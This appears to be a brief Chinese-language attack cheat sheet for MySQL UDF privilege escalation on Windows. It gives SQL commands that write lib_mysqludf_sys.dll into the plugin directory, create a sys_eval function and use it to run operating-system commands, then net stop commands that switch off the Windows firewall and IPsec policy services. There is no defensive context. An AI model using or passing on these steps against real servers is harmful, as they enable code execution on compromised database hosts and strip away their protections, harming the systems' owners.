sqlmap udf

首先导入dll,根据版本导入到windows或mysql 插件目录(select @@plugin_dir)：
select load_file('D:/RECYCLER/lib_mysqludf_sys.dll') into dumpfile'c:/windows/lib_mysqludf_sys.dll'

创建function：
create function sys_eval returns string soname 'lib_mysqludf_sys.dll';

执行命令：
select sys_eval('whoami')

停止windows防火墙和筛选
net stop policyagent
net stop sharedaccess
